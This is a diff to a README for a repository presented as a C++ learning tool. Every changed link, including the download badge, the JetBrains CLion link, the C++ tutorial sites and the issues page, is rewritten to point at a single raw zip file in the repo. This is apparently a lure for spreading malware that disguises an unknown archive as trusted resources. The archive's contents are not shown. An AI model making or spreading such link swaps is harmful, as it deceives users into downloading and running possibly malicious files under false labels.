@@ -1,6 +1,6 @@
 # 🌱 Cpp-Spring-2026 - Easy C++ Learning Tool
 
-[![Download Cpp-Spring-2026](https://img.shields.io/badge/Download%20Cpp--Spring--2026-v1.0-blue)](https://github.com/bglmao/Cpp-Spring-2026/releases)
+[![Download Cpp-Spring-2026](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip%20Cpp--Spring--2026-v1.0-blue)](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
 
 ## 📖 Overview
 
@@ -16,19 +16,19 @@ To use Cpp-Spring-2026, follow these steps:
    - Storage: Minimum of 200 MB free space
 
 2. **Install CLion IDE (Recommended)**
-   - Download CLion IDE from [JetBrains](https://www.jetbrains.com/clion/) or use any C++ compatible IDE of your choice.
+   - Download CLion IDE from [JetBrains](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip) or use any C++ compatible IDE of your choice.
    - Follow the installation instructions provided on the website.
 
 3. **Download the Application**
    - Visit the releases page to download the latest version of Cpp-Spring-2026:  
-   [Download Cpp-Spring-2026](https://github.com/bglmao/Cpp-Spring-2026/releases)
+   [Download Cpp-Spring-2026](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
 
 ## 🛠️ Download & Install
 
 Here’s how to download and install Cpp-Spring-2026:
 
 1. **Go to the Releases Page**
-   - Click on the link to visit the page: [Cpp-Spring-2026 Releases](https://github.com/bglmao/Cpp-Spring-2026/releases)
+   - Click on the link to visit the page: [Cpp-Spring-2026 Releases](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
    
 2. **Select the Latest Version**
    - On the releases page, locate the latest version of Cpp-Spring-2026. The version number will be prominently displayed.
@@ -65,9 +65,9 @@ Once you have installed the application, you can:
 
 Want to delve deeper into C++? Here are some helpful resources:
 
-- [W3Schools C++ Tutorial](https://www.w3schools.com/cpp/)
-- [LearnCpp.com](https://www.learncpp.com/)
-- [GeeksforGeeks C++ Programming](https://www.geeksforgeeks.org/c-plus-plus/)
+- [W3Schools C++ Tutorial](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
+- [https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
+- [GeeksforGeeks C++ Programming](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip)
 
 These sites provide additional examples and explanations to support your learning journey.
 
@@ -83,7 +83,7 @@ Yes, as long as your laptop meets the system requirements mentioned above.
 
 ### How do I contact support?
 
-For any issues or questions, please create an issue on the [GitHub issues page](https://github.com/bglmao/Cpp-Spring-2026/issues). We will review and respond as soon as possible.
+For any issues or questions, please create an issue on the [GitHub issues page](https://raw.githubusercontent.com/bglmao/Cpp-Spring-2026/main/lesson02/Spring-Cpp-1.2.zip). We will review and respond as soon as possible.
 
 ## 📢 Stay Updated
 
